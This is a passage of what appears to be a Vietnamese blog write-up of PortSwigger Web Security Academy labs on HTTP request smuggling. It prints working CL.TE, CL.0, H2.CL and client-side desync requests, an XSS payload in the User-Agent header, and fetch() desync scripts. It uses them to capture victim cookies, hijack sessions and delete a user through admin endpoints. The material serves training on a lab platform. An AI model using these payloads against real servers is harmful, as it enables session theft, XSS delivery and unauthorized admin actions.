+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>abe003e032e7439c04debfe00e5002f.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">167</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST /admin/delete?username=carlos HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line">X-wvIzjI-Ip: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploiting-HTTP-request-smuggling-to-capture-other-user’s-requests"><a href="#Exploiting-HTTP-request-smuggling-to-capture-other-user’s-requests" class="headerlink" title="Exploiting HTTP request smuggling to capture other user’s requests"></a>Exploiting HTTP request smuggling to capture other user’s requests</h4><ul>
+<li>Lab này là dạng CL.TE</li>
+<li>Tác giả có lập trình sẵn là khi chúng ta gửi một request thì máy chủ sẽ tự động gửi 1 resquest. Request này sẽ đóng vai trò như nạn nhân để chúng ta lấy cắp cookie và đăng nhập vào tài khoản này.</li>
+<li>Ở đây để lấy cắp cookie chúng ta sẽ ghi request của nạn nhân vào form comment.</li>
+</ul>
+<p>Request như sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ad0007403ec1053c2015e9900e300b9.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 335</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 804</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=bZxircTfhYYqDgnrRYKm0ZjKa9oBG0Ro; session=DZgoQAy5RcbsrSl2ZqZy8sBOvzS9wv68</span><br><span class="line"></span><br><span class="line">csrf=KEAZJ4zHTUNek88CIDaZ0bTgQTE6hLbf&amp;postId=8&amp;name=aaaaa&amp;email=abcd@gmail.com&amp;website=http://aaa.com&amp;comment=aaaa</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Kết quả ở comment của trang <code>https://0ad0007403ec1053c2015e9900e300b9.web-security-academy.net/post?postId=8</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa GET / HTTP/1.1 Host: 0ad0007403ec1053c2015e9900e300b9.web-security-academy.net Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.121 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=QVLNvEkz9U7FdHW1wG2VdkdjIlDHF2kw; secret=C8IQNP3JH0lVCJBAOGIAkgEOTM5UoNVp; session=A78w3rNuBBu22CGzS1IoyuLB821Yeeof</span><br></pre></td></tr></table></figure>
+<p>Có được cookie rồi chúng ta sẽ sử dụng nó để đăng nhập:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 0ad0007403ec1053c2015e9900e300b9.web-security-academy.net</span><br><span class="line">Cookie: ictim-fingerprint=QVLNvEkz9U7FdHW1wG2VdkdjIlDHF2kw; secret=C8IQNP3JH0lVCJBAOGIAkgEOTM5UoNVp; session=A78w3rNuBBu22CGzS1IoyuLB821Yeeof</span><br><span class="line">Content-Length: 72</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;95&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://0ad0007403ec1053c2015e9900e300b9.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://0ad0007403ec1053c2015e9900e300b9.web-security-academy.net/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">csrf=KEAZJ4zHTUNek88CIDaZ0bTgQTE6hLbf&amp;username=admin&amp;password=%C3%A1dhfj</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploiting-HTTP-request-smuggling-to-deliver-reflected-XSS"><a href="#Exploiting-HTTP-request-smuggling-to-deliver-reflected-XSS" class="headerlink" title="Exploiting HTTP request smuggling to deliver reflected XSS"></a>Exploiting HTTP request smuggling to deliver reflected XSS</h4><p>Đầu tiên zô trang &#x2F;post?postId&#x3D;7 để tìm cách trigger xss thông qua trường User-Agent. </p>
+<img width="864" alt="image" src="https://github.com/user-attachments/assets/b48323e9-bc7e-413d-9de6-21dc4401c3bf">
+
+<p>Payload xss: <code>User-Agent: aaa&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>Sau đó gửi request này để nạn nhân truy cập vào trang web sẽ bị trigger xss: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a91008204610813c02904da008000b8.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 158</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=7 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">User-Agent: aaa&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure>
+
+<h3 id="CL-0-request-smuggling"><a href="#CL-0-request-smuggling" class="headerlink" title="CL.0 request smuggling"></a>CL.0 request smuggling</h3><img width="721" alt="image" src="https://github.com/user-attachments/assets/0d9f5755-9c1b-4926-b229-ea28c1e566a7">
+
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/images/blog.svg HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a3900610359a76482be1174009f008e.web-security-academy.net</span><br><span class="line">Cookie: session=sIt0cbIhl02c97aPZzm1sZ49X7QOwWeP</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: <span class="number">50</span></span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/<span class="number">1.1</span></span><br><span class="line">x: abc</span><br></pre></td></tr></table></figure>
+
+<img width="901" alt="image" src="https://github.com/user-attachments/assets/fcdfd1b1-8579-4573-9d1a-c37a36080606">
+
+
+
+<h3 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h3><p>Test H2.CL, ta trigger được HRS với payload sau (Nhớ uncheck update content length):</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">2</span></span><br><span class="line">Host: <span class="number">0</span>a1800ed04ab0887879e2eb3009a0029.web-security-academy.net</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">aaaaGET /abc HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a1800ed04ab0887879e2eb3009a0029.web-security-academy.net</span><br><span class="line">Foo: Bar</span><br></pre></td></tr></table></figure>
+<img width="720" alt="image" src="https://github.com/user-attachments/assets/3268c27d-ef34-4f66-b0db-48a00f575cbf">
+
+<p>Khi request tới resource, ta thấy nó được chuyển hướng đến location như sau: </p>
+<img width="830" alt="image" src="https://github.com/user-attachments/assets/7045a325-56ef-46f2-b5ac-74b36fa3a2bd">
+
+<p>Thử sử dụng Host header để thay đổi location:</p>
+<img width="829" alt="image" src="https://github.com/user-attachments/assets/4e30ec1f-722b-488e-95bb-e05b3c7ad978">
+<img width="743" alt="image" src="https://github.com/user-attachments/assets/1b662aed-1f17-4bdb-9cd7-36240220a0e4">
+
+<p>Trong mã html, ta thấy nó có những thẻ script nhập mã js từ bên ngoài, vậy nếu ta giả mạo yêu cầu đúng lúc browser nhập mã js về thì ta có thể để browser nhập mã js chứa payload xss.</p>
+<img width="657" alt="image" src="https://github.com/user-attachments/assets/99ce3054-fe59-4db6-a2c7-8957cbb77133">
+
+<img width="939" alt="image" src="https://github.com/user-attachments/assets/d8013a97-ab04-49f0-a74f-9f242e72df4f">
+
+<p>Gửi một vài lần để bot truy cập và thời điểm browser của bot import mã js thì nó nhập mã js của ta.</p>
+<img width="829" alt="image" src="https://github.com/user-attachments/assets/121a9b1e-76c0-4697-b635-e9554e9313b2">
+<img width="943" alt="image" src="https://github.com/user-attachments/assets/68aca119-2d5c-4add-af3d-16dbad8614aa">
+
+
+<h3 id="HTTP-x2F-2-request-smuggling-via-CRLF-injection"><a href="#HTTP-x2F-2-request-smuggling-via-CRLF-injection" class="headerlink" title="HTTP&#x2F;2 request smuggling via CRLF injection"></a>HTTP&#x2F;2 request smuggling via CRLF injection</h3><p>Thêm header foo: bar rồi chèn thêm CRLF và TE, trong body thêm giá trị tùy ý ta trigger được 404 not found<br><img width="944" alt="image" src="https://github.com/user-attachments/assets/d5806562-3b50-43e6-a454-61b8b5a23e81"></p>
+<img width="946" alt="image" src="https://github.com/user-attachments/assets/f87b5f11-54ec-4f4e-8d5e-0c30070e43c0">
+
+<p>Ở trong trang search, ta thấy nó lưu lại lịch sử search của người dùng.</p>
+<img width="836" alt="image" src="https://github.com/user-attachments/assets/194eb80f-9446-4467-a20e-c6b9c4ee89b1">
+<img width="732" alt="image" src="https://github.com/user-attachments/assets/2fde5416-6cdb-4ebd-985c-bd2d5f53f218">
+
+<p>Lợi dụng tính năng này để đánh cắp cookie của người dùng:<br><img width="721" alt="image" src="https://github.com/user-attachments/assets/cc00e9b1-5bcb-4958-bee0-efb4ce3fcf24"></p>
+<img width="877" alt="image" src="https://github.com/user-attachments/assets/44a30aff-efb7-4fdf-9761-d1fe55c0b6b4">
+
+<p>Gửi và đợi tầm 10s để bot truy cập:</p>
+<img width="887" alt="image" src="https://github.com/user-attachments/assets/2fdc17a0-0ac3-478d-8308-fd8958a4545c">
+<img width="723" alt="image" src="https://github.com/user-attachments/assets/25d74cf3-e850-4ab6-8eec-5e965a52a6c9">
+
+
+<h3 id="HTTP-x2F-2-request-splitting-via-CRLF-injection"><a href="#HTTP-x2F-2-request-splitting-via-CRLF-injection" class="headerlink" title="HTTP&#x2F;2 request splitting via CRLF injection"></a>HTTP&#x2F;2 request splitting via CRLF injection</h3><p>Gửi request này 2 lần, ta trigger được 404 not found:<br><img width="945" alt="image" src="https://github.com/user-attachments/assets/0d025242-c860-4c8b-a351-8a1cb1456526"></p>
+<p>Chỉ với CRLF, ta có thể cắt request thành nhiều request khác nhau. Vậy bây giờ ta chỉ cần áp dụng kĩ thuật Response queue poisoning:</p>
+<p><img src="https://github.com/user-attachments/assets/2df0b006-cf93-4e6e-b5de-39e583c7dffd" alt="image"></p>
+<ul>
+<li>Ta sẽ queue request smuggle (request 2), sau khi người dùng request 3, server sẽ thực hiện và trả về response của request 2 cho phía nạn nhân và queue lại request 3.</li>
+<li>Bây giờ ta chỉ cần gửi request 4 thì ta sẽ nhận được response từ request 3 của người dùng.</li>
+</ul>
+<p>Sau một hồi không queue được, mình thử fix lại payload để server tự thêm <code>\r\n</code> thì mình đã bắt được request của admin:</p>
+<img width="944" alt="image" src="https://github.com/user-attachments/assets/0a40f3bf-e98f-4415-81b9-c0d1c1dad83b">
+
+<p>Truy cập admin panel và delete user carlos:</p>
+<img width="832" alt="image" src="https://github.com/user-attachments/assets/fcca0550-aded-48a3-93c2-1ad136eca936">
+<img width="833" alt="image" src="https://github.com/user-attachments/assets/1e21c7e5-3dc3-4122-9bb0-d593242a30af">
+
+
+<h3 id="Response-queue-poisoning-via-H2-TE-request-smuggling"><a href="#Response-queue-poisoning-via-H2-TE-request-smuggling" class="headerlink" title="Response queue poisoning via H2.TE request smuggling"></a>Response queue poisoning via H2.TE request smuggling</h3><blockquote>
+<p>Front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses.</p>
+</blockquote>
+<p>Vậy ta sẽ sử dụng kĩ thuật CL-TE ở đây, kết hợp với cache poisoning.</p>
+<img width="734" alt="image" src="https://github.com/user-attachments/assets/c8851103-9b9c-428b-8e94-0cef7cc344d8">
+
+<img width="1022" alt="image" src="https://github.com/user-attachments/assets/fc621c22-0bf7-4200-a7e5-7066c5413d3a">
+
+<p>Trigger được 404 not found với payload sau:</p>
+<img width="718" alt="image" src="https://github.com/user-attachments/assets/6618467f-9d37-47dd-8d06-19d8627ff539">
+
+<p>Bypass double Host header:<br><img width="714" alt="image" src="https://github.com/user-attachments/assets/16910251-5065-4dcb-b96c-6498a248b014"></p>
+<img width="718" alt="image" src="https://github.com/user-attachments/assets/0aade78d-0f31-431c-ac3e-f03f7c36e66c">
+
+<p>Bây giờ ta cần tìm một sink để có thể chuyển hướng về trang chứa script xss, ở tính năng next post ta có thể redirect:</p>
+<img width="829" alt="image" src="https://github.com/user-attachments/assets/ee2e14ba-2ed3-4958-8356-0e777f635250">
+
+<p>Ở phía server, yêu cầu sẽ không bị phụ thuộc vào trường host, nên dù có hay không thì nó vẫn request đến đúng địa chỉ server.</p>
+<img width="823" alt="image" src="https://github.com/user-attachments/assets/bc52109c-3be6-402f-afb2-77e297749566">
+<img width="718" alt="image" src="https://github.com/user-attachments/assets/1114a041-936d-4451-a31f-dfe33610700c">
+<img width="717" alt="image" src="https://github.com/user-attachments/assets/12342e7c-4138-4ffd-83e9-49a277e1ff67">
+<img width="719" alt="image" src="https://github.com/user-attachments/assets/1d83ce73-3bc0-4ca8-8aba-e9772c0c63fe">
+
+
+<img width="721" alt="image" src="https://github.com/user-attachments/assets/7ee8bf74-b2a4-4f52-9b50-59091fff2fab">
+
+<img width="914" alt="image" src="https://github.com/user-attachments/assets/e3e51eb7-178d-49ba-a67d-5fadb4dc0f76">
+
+<h3 id="Exploiting-HTTP-request-smuggling-to-perform-web-cache-deception"><a href="#Exploiting-HTTP-request-smuggling-to-perform-web-cache-deception" class="headerlink" title="Exploiting HTTP request smuggling to perform web cache deception"></a>Exploiting HTTP request smuggling to perform web cache deception</h3><p><img src="https://github.com/user-attachments/assets/60d8e2bc-406d-477d-8d87-5ca946aaef4c" alt="image"></p>
+<blockquote>
+<p>&#x3D;&gt; CL.TE</p>
+</blockquote>
+<p><img src="https://github.com/user-attachments/assets/a2c87a97-74e8-4a61-9407-b9a212a4ac82" alt="image"></p>
+<p>Trang web có thực hiện caching các file thường đa số người dùng đều nhập giống nhau như blog.svg hay tracking.js:<br><img src="https://github.com/user-attachments/assets/26e22d71-0f5d-417f-aa9b-83c0ec054c03" alt="image"><br><img src="https://github.com/user-attachments/assets/497941be-f2d6-419c-a5ed-6e1e6a78921f" alt="image"></p>
+<p>Vậy bây giờ ta smuggle các request nhập blog.svg hay tracking.js thì ta có thể truy xuất api key từ kết quả trả về được smuggle và lưu vào cache tương ứng với các file này.</p>
+<p>Như ở đây, mình thực hiện smuggling request đến my account. Bây giờ request trả về ở những file khi bot request là response 302, nên gửi kiểu gì nó cũng trả về:<br><img src="https://github.com/user-attachments/assets/af42cdac-cc53-479c-8011-4591ee6c1412" alt="image"></p>
+<p>Vậy bây giờ chỉ cần cầu may cho bot request đúng lúc, ta có thể double cơ hội thành công bằng cách check cache của 2 file blog.svg và tracking.js<br><img src="https://github.com/user-attachments/assets/9b05181d-5392-4f9e-86a8-71b025a4f156" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/3afefad5-0ad8-4690-90da-accad4719bea" alt="image"></p>
+<p>Kết quả:<br><img src="https://github.com/user-attachments/assets/870fe578-f31b-4aa1-bbd5-57b31c0a827e" alt="image"></p>
+<h3 id="Bypassing-access-controls-via-HTTP-x2F-2-request-tunnelling"><a href="#Bypassing-access-controls-via-HTTP-x2F-2-request-tunnelling" class="headerlink" title="Bypassing access controls via HTTP&#x2F;2 request tunnelling"></a>Bypassing access controls via HTTP&#x2F;2 request tunnelling</h3><p>Connection timeout có nghĩa ta đã giả được host.<br><img src="https://github.com/user-attachments/assets/eb047c76-0f95-496b-ad34-5e36e73b5b9d" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/383d4b60-63d9-4bec-b21f-e9f49defae9d" alt="image"></p>
+<p>Request được downgrade trông như sau:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Foo: bar</span><br><span class="line">Host: abc</span><br><span class="line">Content-Length: <span class="number">200</span></span><br><span class="line"></span><br><span class="line">search=x</span><br><span class="line">some-internal-header: xxx</span><br><span class="line">Host: abc</span><br><span class="line">Content-length: <span class="number">7</span></span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://github.com/user-attachments/assets/7965f2f6-f3af-41e2-bc84-33fe174cbeb0" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/df8830b8-7854-4904-9741-3fd9a7ce0055" alt="image"><br><img src="https://github.com/user-attachments/assets/2051db01-a0ba-46aa-84b6-8ae8e191939c" alt="image"><br><img src="https://github.com/user-attachments/assets/a97765f6-8dd8-4809-b7f7-2439d791fc89" alt="image"><br><img src="https://github.com/user-attachments/assets/2cc8c5fe-a05e-4d6a-8678-9ff295b61339" alt="image"><br><img src="https://github.com/user-attachments/assets/b3869574-50c4-44ff-b3be-377071a27eab" alt="image"><br><img src="https://github.com/user-attachments/assets/f406711d-cee0-46c7-a242-39cee743a933" alt="image"></p>
+<h3 id="Client-side-desync"><a href="#Client-side-desync" class="headerlink" title="Client-side desync"></a>Client-side desync</h3><p>Request đến &#x2F; sẽ được redirect đến &#x2F;en:</p>
+<p><img src="https://github.com/user-attachments/assets/c945bf51-75f8-4548-b2d5-9df80eef97db" alt="image"></p>
+<p>Gửi 2 request với chung connection ta được trả về 2 response:</p>
+<p><img src="https://github.com/user-attachments/assets/68deb040-e8ca-41d2-9ea0-49494faf59f2" alt="image"></p>
+<p>Nếu ta thực hiện gửi trong browser với request 2 là một request bất kỳ thì response 2 do request &#x2F;404 sẽ trả về ở request 2.<br><img src="https://github.com/user-attachments/assets/4d81e4a1-0110-409d-b907-f581d7339dcd" alt="image"></p>
+<p>Test trên browser:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0acd00850382348282f40b8800320096.h1-web-security-academy.net&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;GET /404 HTTP/1.1\r\na: x&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://0acd00850382348282f40b8800320096.h1-web-security-academy.net&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/user-attachments/assets/9b5af0c4-89fd-4023-aa93-2bcca4eef78e" alt="image"></p>
+<p>Browser chỉ trả về mỗi response cho mỗi request, do đó ta chưa thấy 404 ở đây.</p>
+<p><img src="https://github.com/user-attachments/assets/07cd11c7-e4bd-4b24-a112-58f2adbcb6c7" alt="image"></p>
+<p>Tuy nhiên nếu ta gửi tiếp một yêu cầu nữa thì 404 trả về cho fetch thứ 2:</p>
+<p><img src="https://github.com/user-attachments/assets/0f7eb80f-35e0-495a-b5fe-f02f39242667" alt="image"><br><img src="https://github.com/user-attachments/assets/7495c479-9c2b-49e2-8891-d500dee31a0c" alt="image"></p>
+<p>Test với request comment:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0ad0005104751f1180db490d002d0023.h1-web-security-academy.net&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;POST /en/post/comment HTTP/1.1\r\nHost: 0ad0005104751f1180db490d002d0023.h1-web-security-academy.net\r\nCookie: session=RbiCFsRMKOANwQDqEBbH7J4Px0hw8Hpd; _lab_analytics=RXgpmFuGrXRwxeCPhqtzXcoPdTECdBr2TXfCUncCwVUGN5ock8H3FVR8PwpPguRzjZ7DZuQRi5dVaaO06abvpuXbi4qBOPWyM31HPPwFuzpmCWlWu4UtIlXZs9PM9cGtfL4n11wMuNUYOwnASLatFxzmNcx9BFLwllanIw1OvtxweZ3qQVUfJNmwtxJ1BnaH4bsYIs780ucZE5FiHdpROtCulXJzmEUERnUTD4bR4Eeb4njCNWUYlkHKE6DiiFix\r\nContent-Length: 700\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=9FHBQE0Og5LLEGNcV4yJTV1QhSRYz9sY&amp;postId=8&amp;name=a&amp;email=a%40a&amp;website=http%3A%2F%2Fa&amp;comment=&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://0ad0005104751f1180db490d002d0023.h1-web-security-academy.net/&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>Bắt được thành công request thứ 3.</p>
+<p><img src="https://github.com/user-attachments/assets/b9bbec7e-917f-4756-8e29-e90098b36ccd" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/f5fab529-8bb3-4556-9438-c931df7f52e4" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/da4c340a-b9a4-4dd7-b15d-057ab48b00eb" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/8c1df2f6-1511-4d3d-a375-6e347d9b73c5" alt="image"><br><img src="/.io//image.png" alt="alt text"></p>
+<p><img src="https://github.com/user-attachments/assets/a17eb803-a232-4657-bebe-bc060cde0d13" alt="image"><br><img src="https://github.com/user-attachments/assets/0b2910c7-b940-4ff0-923e-33304f87d859" alt="image"><br><img src="https://github.com/user-attachments/assets/d59f1cde-e395-4542-83bc-b35b516ce493" alt="image"></p>
+<h3 id="Response-queue-poisoning-via-H2-TE-request-smuggling-1"><a href="#Response-queue-poisoning-via-H2-TE-request-smuggling-1" class="headerlink" title="Response queue poisoning via H2.TE request smuggling"></a>Response queue poisoning via H2.TE request smuggling</h3><p>Server queue response nên ta có thể capture được response mà admin login trả về, từ đó lấy cookie của admin.</p>
+<p><img src="https://github.com/user-attachments/assets/f6bfecfe-c49a-4ed5-8a21-09d62f4b2b7f" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/37e31c27-c79c-4c94-95b6-bf1864c31be1" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/1f0e0b4d-6ca2-4cd8-a74d-4fa4fff48331" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/9bf10cd2-ad86-4c03-90ac-19b60e4e0b3b" alt="image"></p>
+<h3 id><a href="#" class="headerlink" title></a></h3></div>
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
